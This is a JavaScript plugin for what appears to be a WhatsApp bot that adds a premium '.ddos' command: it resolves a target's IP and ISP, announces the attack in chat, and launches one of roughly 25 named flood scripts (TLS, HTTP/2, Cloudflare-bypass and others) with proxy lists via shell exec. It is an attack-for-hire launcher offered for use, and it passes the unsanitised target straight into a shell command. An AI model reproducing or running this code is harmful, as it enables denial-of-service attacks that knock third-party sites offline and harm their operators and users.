const fetch = require('node-fetch')
const axios = require('axios')
const { exec } = require('child_process');
const { promisify } = require('util');
const url = require('url')

const cooldowns = new Map();

const handler = async (m, { conn, command, args }) => {
  if (args.length < 3) return conn.reply(m.chat, '\`\`\ [🤞] .ddos [url] [durasi] [methods]\`\`\`', m);

  const blacklistedDomains = ['google.com', 'tesla.com', 'fbi.gov', 'youtube.com','kominfo.go.id','dpr.go.id']
                             

  if (blacklistedDomains.some(domain => args[0].includes(domain))) {
    return conn.reply(m.chat, 'hard target pepek.', m);
  }

  const target = args[0]
  const duration = args[1]
  const methods = args[2]
  const parsedUrl = new url.URL(target);

  const hostname = parsedUrl.hostname;

  const path = parsedUrl.pathname;
  const thumb = global.attacking
  const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)

  const result = response.data;

  const deepinfo = `
\`Hostname: ${hostname}\`
\`Path: ${path}\`
\`Isp: ${result.isp}\`
\`Ip: ${result.query}\`
\`AS: ${result.as}\``
  const details = `â”‚ Creator: syafrial
â”‚ Target: ${target}
â”‚ Methods: ${methods}
â”‚ Duration: ${duration}
${deepinfo}`
  
if ( methods === 'tls' ) {
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXTls.js ${target} ${duration} 190 10`)
} else if ( methods === 'ninja' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXNinja.js ${target} ${duration}`)
} else if ( methods === 'tzy' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/tzik.js ${target} ${duration} 190 10 proxy.txt`)
} else if ( methods === 'gojo' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/gojov5.js ${target} ${duration} 90 25 proxy.txt`)
} else if ( methods === 'bot' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/BOT.js ${target} ${duration} 900000 30000000 proxy.txt`)
} else if ( methods === 'thunder' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXThunder.js ${target} ${duration} 120 30 proxy.txt`)
} else if ( methods === 'ikansepatX' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/ikansepat.js ${target} ${duration} 120 31 proxy.txt`)
} else if ( methods === 'x' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/xyn.js ${target} ${duration} 120 33 proxy.txt`)
} else if ( methods === 'sis-tls' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/sis-tls.js ${target} ${duration} 102 33 proxy.txt`)
} else if ( methods === 'https' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXHttps.js ${target} ${duration}`)
} else if ( methods === 'mix' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXMix.js ${target} ${duration} 91 30 proxy.txt`)
} else if ( methods === 'kill' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXKill.js ${target} ${duration} 100 10`)
} else if ( methods === 'tls-pro' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/TLS-PRO.js ${target} proxy.txt $(duration)`)
} else if ( methods === 'rape' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXRape.js syafrial ${duration} 120 proxy.txt 30 ${target}`)
} else if ( methods === 'browsers' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXBrowsers.js ${target} ${duration} 130 30 proxy.txt`)
} else if ( methods === 'bypass' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXBypass.js ${target} ${duration} 100 10 proxy.txt`)
} else if ( methods === 'storm' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXManuk.js ${target} ${duration} 120 40  proxy.txt`)
} else if ( methods === 'slim' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXLimau.js ${target} ${duration} 120 30 proxy.txt`)
} else if ( methods === 'quantum' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/quantum.js ${target} ${duration} 120 30 proxy.txt`)
} else if ( methods === 'raw' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXRaw.js ${target} ${duration}`)
} else if ( methods === 'glory' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/Glory.js ${target} ${duration} 100 10 proxy.txt`)
} else if ( methods === 'nexus' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/nexus.js ${target} proxy.txt ${duration} 120 30 `)
} else if ( methods === 'galaxy' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/galaxy.js ${target} ${duration} `)
} else if ( methods === 'h2' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/h2.js ${target} 5000 100 10 proxy.txt`)
} else if ( methods === 'strike' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: false, 
title: `Attacking ${target}`,
body: `Mancing 500, 502, 503, CTO Wak`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/StarsXStrike.js GET ${target} ${duration} 120 90 proxy.txt --randrate`)
} else if ( methods === 'medusa' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: false, 
title: `Attacking ${target}`,
body: `Mancing 500, 502, 503, CTO Wak`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/Medusa.js ${target} ${duration} 100 30 proxy.txt`)
} else if ( methods === 'cf-kill' ) {     
await conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: false, 
title: `Attacking ${target}`,
body: `Mancing 500, 502, 503, CTO Wak`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/syafrial/cg.js ${target} ${duration} 100 30 proxy.txt`)
} else {
	m.reply(`_*Unknown Methods*_`)
}
  }

handler.help = ['ddos'].map(v => v + ' <url> <duration>');
handler.tags = ['tools', 'attack'];
handler.premium = true
handler.command = /^(ddos)$/i;
module.exports = handler
